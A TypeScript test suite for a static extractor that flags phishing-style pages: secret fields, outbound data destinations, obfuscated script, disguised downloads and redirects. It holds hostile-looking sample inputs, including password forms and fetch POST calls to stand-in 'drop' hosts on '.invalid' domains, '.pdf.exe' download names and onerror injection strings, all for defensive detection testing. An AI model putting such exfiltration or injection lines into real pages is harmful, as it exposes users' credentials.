/**
 * The static extractor — E07 AC4 (facts, including fields and URLs that exist
 * only in JSX or a script string) and AC5 (the budget, a 5 MB page, degrading
 * instead of throwing). PRD §6.2, edge cases 6 and 7.
 *
 * NO MOCKS: the real parsers over the fixture pages in `fixtures/`, every one
 * inert (each URL on an `.invalid` host), and over pages generated here.
 */
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { test } from "node:test";

import { SCAN_TEXT_BUDGET_CHARS } from "@kept/shared";

import { extract } from "./extract";
import type { Extraction, PageFacts } from "./types";

const ADDRESS = "fixture123.kept.invalid";

function fixture(name: string): string {
  return readFileSync(new URL(`./fixtures/${name}.html`, import.meta.url), "utf8");
}

function run(name: string): Extraction {
  return extract(fixture(name), ADDRESS);
}

/** The page with every `<script>` removed — what a markup-only reader would see. */
function withoutScripts(html: string): string {
  return html.replace(/<script\b[\s\S]*?<\/script>/gi, "");
}

function size(extraction: Extraction): number {
  return JSON.stringify(extraction.facts).length + extraction.text.length;
}

/** The AC4 facts of one fixture. */
type Expected = Partial<
  Pick<
    PageFacts,
    | "secretField"
    | "dataDestinations"
    | "secretsLeavePage"
    | "obfuscated"
    | "insertsRemoteHtml"
    | "downloads"
    | "redirectTo"
  >
> & { onlyInScript?: (keyof PageFacts)[] };

const EXPECTED: Record<string, Expected> = {
  "secret-field-markup": { secretField: true, dataDestinations: [], secretsLeavePage: false },
  "secret-field-jsx": { secretField: true, dataDestinations: [], onlyInScript: ["secretField"] },
  "secret-field-script-string": { secretField: true, onlyInScript: ["secretField"] },
  "destinations-form-action": {
    secretField: true,
    dataDestinations: ["verify-account.invalid"],
    secretsLeavePage: true,
  },
  "destinations-script-fetch": {
    secretField: true,
    dataDestinations: ["drop.invalid", "beacon.invalid"],
    secretsLeavePage: true,
    onlyInScript: ["dataDestinations", "secretsLeavePage"],
  },
  "destinations-jsx": {
    secretField: true,
    dataDestinations: ["jsx-post.invalid"],
    secretsLeavePage: true,
    onlyInScript: ["secretField", "dataDestinations", "secretsLeavePage"],
  },
  "destinations-markup-in-string": {
    secretField: true,
    dataDestinations: ["string-form.invalid"],
    secretsLeavePage: true,
    onlyInScript: ["secretField", "dataDestinations", "secretsLeavePage"],
  },
  "obfuscated-eval-base64": { obfuscated: true, secretField: true, onlyInScript: ["obfuscated"] },
  "obfuscated-fromcharcode": { obfuscated: true, onlyInScript: ["obfuscated"] },
  "obfuscated-hex-escapes": { obfuscated: true, secretField: true, onlyInScript: ["obfuscated", "secretField"] },
  "obfuscated-packer": { obfuscated: true, onlyInScript: ["obfuscated"] },
  "clean-base64-image": { obfuscated: false, secretField: true, secretsLeavePage: false },
  "clean-minified": { obfuscated: false, secretField: true, secretsLeavePage: false },
  "remote-html-script": { insertsRemoteHtml: true, onlyInScript: ["insertsRemoteHtml"] },
  "remote-html-jsx": { insertsRemoteHtml: true, onlyInScript: ["insertsRemoteHtml"] },
  "remote-html-static": { insertsRemoteHtml: false, dataDestinations: [] },
  "downloads-markup": { downloads: ["Invoice_2026.pdf.exe", "setup.msi"] },
  "downloads-script": {
    downloads: ["wallet.apk", "AdobeUpdate.dmg"],
    redirectTo: "cdn.invalid",
    onlyInScript: ["downloads", "redirectTo"],
  },
  "redirect-meta": { redirectTo: "next-step.invalid" },
  "redirect-script": { redirectTo: "elsewhere.invalid", onlyInScript: ["redirectTo"] },
  "redirect-same-host": { redirectTo: null },
  "clean-supabase-login": {
    secretField: true,
    dataDestinations: ["abcd1234.supabase.invalid"],
    secretsLeavePage: true,
    onlyInScript: ["secretField", "dataDestinations"],
  },
  "clean-netflix-clone": { secretField: true, dataDestinations: [], secretsLeavePage: false },
};

/** A fact's "nothing found" value, for the markup-only comparison. */
const ABSENT: Partial<Record<keyof PageFacts, unknown>> = {
  secretField: false,
  dataDestinations: [],
  secretsLeavePage: false,
  obfuscated: false,
  insertsRemoteHtml: false,
  downloads: [],
  redirectTo: null,
};

for (const [name, expected] of Object.entries(EXPECTED)) {
  test(`AC4 ${name}: facts`, () => {
    const { facts } = run(name);
    const { onlyInScript = [], ...values } = expected;
    for (const [key, value] of Object.entries(values)) {
      assert.deepEqual(facts[key as keyof PageFacts], value, `${name}.${key}`);
    }
    if (onlyInScript.length > 0) {
      const markupOnly = extract(withoutScripts(fixture(name)), ADDRESS).facts;
      for (const key of onlyInScript) {
        assert.deepEqual(markupOnly[key], ABSENT[key], `${name}.${key} must come from script, not markup`);
      }
    }
  });
}

test("AC4: every fixture is inert — every absolute URL is on an .invalid host", () => {
  for (const name of Object.keys(EXPECTED)) {
    const urls = fixture(name).match(/\b(?:https?|wss?):\/\/[^\s"'`<>()\\]+/gi) ?? [];
    for (const url of urls) {
      assert.match(new URL(url).hostname, /\.invalid$/, `${name}: ${url}`);
    }
  }
});

test("forms: action host, method, fields with labels — markup, JSX and markup in a string", () => {
  const markup = run("secret-field-markup").facts;
  assert.deepEqual(markup.forms, [
    {
      actionHost: "none",
      method: "post",
      fields: [
        { type: "password", name: "pw", label: "Password" },
        { type: "text", name: "user", label: "Username" },
      ],
    },
  ]);
  assert.deepEqual(markup.headings, ["Sign in"]);
  assert.deepEqual(markup.buttons, ["Continue"]);
  assert.equal(markup.title, "Team notes — sign in");

  const jsx = run("destinations-jsx").facts;
  assert.deepEqual(jsx.forms, [
    { actionHost: "jsx-post.invalid", method: "post", fields: [{ type: "password", name: "p", label: "Password" }] },
  ]);
  assert.deepEqual(jsx.buttons, ["Log in"]);

  const card = run("secret-field-jsx").facts;
  assert.deepEqual(card.forms[0]?.fields, [
    { type: "text", name: "cardNumber", label: "1234 5678 9012 3456" },
    { type: "text", name: null, label: "CVC" },
  ]);
  assert.deepEqual(card.headings, ["Pay for your order"]);

  const wallet = run("destinations-markup-in-string").facts;
  assert.deepEqual(wallet.headings, ["Restore your wallet"]);
  assert.ok(wallet.forms.some((f) => f.actionHost === "string-form.invalid"));
});

test("host lists: links, iframes and external scripts, deduplicated, most frequent first, own host excluded", () => {
  const html = `<!doctype html><title>Hosts</title>
    <script src="https://cdn.invalid/a.js"></script><script src="https://cdn.invalid/b.js"></script>
    <script src="/local.js"></script><iframe src="https://embed.invalid/x"></iframe>
    <a href="https://one.invalid/">1</a><a href="https://two.invalid/">2</a><a href="https://two.invalid/b">2b</a>
    <a href="https://${ADDRESS}/self">self</a><a href="/relative">rel</a><a href="mailto:someone@example.invalid">mail</a>`;
  const { facts } = extract(html, ADDRESS);
  assert.deepEqual(facts.externalScripts, ["cdn.invalid"]);
  assert.deepEqual(facts.iframes, ["embed.invalid"]);
  assert.deepEqual(facts.linkHosts, ["two.invalid", "one.invalid"]);

  const many = Array.from({ length: 60 }, (_, i) => `<a href="https://h${i}.invalid/">x</a>`).join("");
  assert.equal(extract(many, ADDRESS).facts.linkHosts.length, 20);
});

test("text: PRD order, no CSS, no raw script code, no emails", () => {
  const html = `<!doctype html><html><head><title>Order page</title>
    <style>.secret-css-rule { color: red }</style></head><body>
    <p>Body words first in the markup</p>
    <h1>Main heading</h1>
    <form><label>Card holder <input name="holder"></label></form>
    <button>Buy now</button>
    <p>Write to owner@example.invalid for help</p>
    <script>const msg = "A script sentence for people"; fetch("/x").then(function (r) { return r.json(); });</script>
    </body></html>`;
  const { text } = extract(html, ADDRESS);
  const order = ["Order page", "Main heading", "Card holder", "Buy now", "Body words first", "A script sentence"];
  const positions = order.map((s) => text.indexOf(s));
  assert.ok(positions.every((p) => p >= 0), `all sections present: ${JSON.stringify(text)}`);
  assert.deepEqual([...positions].sort((a, b) => a - b), positions, "title+headings → form → buttons → body → script");
  assert.ok(!text.includes("secret-css-rule") && !text.includes("color"), "no CSS");
  assert.ok(!text.includes("fetch(") && !text.includes("function") && !text.includes("=>"), "no script code");
  assert.ok(!text.includes("owner@example.invalid") && text.includes("[email]"), "emails redacted");

  const css = run("clean-netflix-clone").text;
  assert.ok(!css.includes("background"), "inline <style> never reaches the text");
});

test("the extractor never executes page code", () => {
  const html = `<script>globalThis.__keptScanRan = true;</script>
    <img src="x" onerror="globalThis.__keptScanRan = true">
    <script type="text/babel">globalThis.__keptScanRan = true; const A = () => <b>hi</b>;</script>
    <div id="x"></div><script>document.getElementById("x").innerHTML = '<img src=x onerror="globalThis.__keptScanRan=true">';</script>`;
  extract(html, ADDRESS);
  assert.equal((globalThis as { __keptScanRan?: boolean }).__keptScanRan, undefined);
});

test("AC5: output never exceeds the budget, whatever the page", () => {
  const forms = Array.from(
    { length: 40 },
    (_, f) =>
      `<form action="https://f${f}-${"x".repeat(80)}.invalid/p"><h2>${"Heading ".repeat(30)}${f}</h2>` +
      Array.from(
        { length: 40 },
        (_, i) =>
          `<label for="i${f}-${i}">${"Label words ".repeat(20)}</label><input id="i${f}-${i}" name="${"n".repeat(200)}${i}" type="${"t".repeat(50)}">`,
      ).join("") +
      `<button>${"Press ".repeat(40)}${f}</button></form>`,
  ).join("");
  const links = Array.from({ length: 200 }, (_, i) => `<a href="https://${"l".repeat(70)}${i}.invalid/${i}.exe">x</a>`).join("");
  const iframes = Array.from({ length: 50 }, (_, i) => `<iframe src="https://${"i".repeat(70)}${i}.invalid/"></iframe>`).join("");
  const scripts = Array.from({ length: 50 }, (_, i) => `<script src="https://${"s".repeat(70)}${i}.invalid/a.js"></script>`).join("");
  const heavy = `<title>${"T".repeat(500)}</title><meta name="description" content="${"D".repeat(5000)}">${forms}${links}${iframes}${scripts}<p>${"body text ".repeat(5000)}</p>`;
  for (const html of [heavy, fixture("clean-base64-image"), fixture("destinations-script-fetch")]) {
    const extraction = extract(html, ADDRESS);
    assert.ok(size(extraction) <= SCAN_TEXT_BUDGET_CHARS, `facts + text = ${size(extraction)}`);
  }
  const extraction = extract(heavy, ADDRESS);
  assert.ok(extraction.text.length > 0, "the facts leave room for text");
  assert.equal(extraction.facts.forms.length, 5);
});

test("AC5 / edge case 7: a 5 MB page — budget held, facts over the whole page, script beyond 1 MB read by pattern", () => {
  const filler = `<p>${"Plain paragraph text for a very long page. ".repeat(40)}</p>\n`;
  const bigScript = `<script>var data = [${"1234567, ".repeat(25000)}];</script>\n`; // ~225 KB each
  const parts: string[] = ["<!doctype html><html><head><title>Huge page</title></head><body><h1>Start</h1>"];
  let length = 0;
  while (length < 5 * 1024 * 1024) {
    const chunk = parts.length % 300 === 0 ? bigScript : filler;
    parts.push(chunk);
    length += chunk.length;
  }
  // Everything that matters sits at the very end: past the 1 MB parse budget, millions of chars in.
  parts.push(`<form action="https://tail-form.invalid/in"><input type="password" name="pw"></form>
    <a href="https://tail.invalid/Tail_Update.exe">update</a>
    <script>fetch("https://tail-drop.invalid/c", { method: "POST" }); location.href = "https://tail-redirect.invalid/";</script>
    </body></html>`);
  const html = parts.join("");
  assert.ok(html.length >= 5 * 1024 * 1024);

  const started = performance.now();
  const extraction = extract(html, ADDRESS);
  const elapsed = performance.now() - started;
  const { facts } = extraction;

  assert.ok(size(extraction) <= SCAN_TEXT_BUDGET_CHARS, `facts + text = ${size(extraction)}`);
  assert.ok(facts.textChars > 3 * 1024 * 1024, "text counted over the whole page");
  assert.ok(facts.scriptBytes > 1024 * 1024);
  assert.ok(facts.unparsedScriptBytes > 0, "script past the 1 MB budget is not parsed");
  assert.ok(facts.unparsedScriptBytes <= facts.scriptBytes);
  assert.equal(facts.secretField, true);
  assert.deepEqual(facts.downloads, ["Tail_Update.exe"]);
  assert.equal(facts.redirectTo, "tail-redirect.invalid");
  // §6.2: with a network call in script, every URL-literal host in script counts — the redirect's too.
  assert.deepEqual([...facts.dataDestinations].sort(), ["tail-drop.invalid", "tail-form.invalid", "tail-redirect.invalid"]);
  assert.equal(facts.secretsLeavePage, true);
  assert.ok(elapsed < 10_000, `extract took ${Math.round(elapsed)} ms`);
});

test("edge case 6: unparseable HTML and script degrade and never throw", () => {
  const inputs = [
    "",
    "<<<>>><<!--",
    "<html><body><form action='https://a.invalid/x'><input type=password><p>never closed <b>nor this",
    "\u0000￿\uD800 binary junk \u0007",
    "<div>".repeat(50_000),
    "<script>function ( {{{ <<< ]]] (((</script>",
    `<script type="text/babel">const A = () => <div><input type="password" </div>;</script>`,
    "<svg><script>alert(1)</script><foreignObject><form><input type=password></form></foreignObject></svg>",
  ];
  for (const html of inputs) {
    let extraction: Extraction | undefined;
    assert.doesNotThrow(() => {
      extraction = extract(html, ADDRESS);
    }, JSON.stringify(html.slice(0, 40)));
    assert.ok(extraction && size(extraction) <= SCAN_TEXT_BUDGET_CHARS);
  }

  const unclosed = extract(inputs[2] ?? "", ADDRESS).facts;
  assert.equal(unclosed.secretField, true);
  assert.deepEqual(unclosed.dataDestinations, ["a.invalid"]);

  // A script Babel cannot recover: counted as unparsed, still read by pattern.
  const broken = `<script>function ( {{{ ]]] ; fetch("https://broken-drop.invalid/x"); var t = { type: "password" };</script>`;
  const facts = extract(broken, ADDRESS).facts;
  assert.ok(facts.scriptBytes > 0);
  assert.equal(facts.unparsedScriptBytes, facts.scriptBytes);
  assert.deepEqual(facts.dataDestinations, ["broken-drop.invalid"]);
  assert.equal(facts.secretField, true);
});

test("purity: the scan core imports no database, storage, network client or Next module", () => {
  const allowed = new Set(["@kept/shared", "@babel/parser", "@babel/types", "htmlparser2", "zod", "./types"]);
  for (const file of ["./extract.ts", "./policy.ts", "./types.ts"]) {
    const source = readFileSync(new URL(file, import.meta.url), "utf8");
    const imports = [...source.matchAll(/^import[\s\S]*?from\s+"([^"]+)";/gm)].map((m) => m[1]);
    assert.ok(imports.length > 0, file);
    for (const specifier of imports) {
      assert.ok(specifier && allowed.has(specifier), `${file} imports ${specifier}`);
    }
  }
});
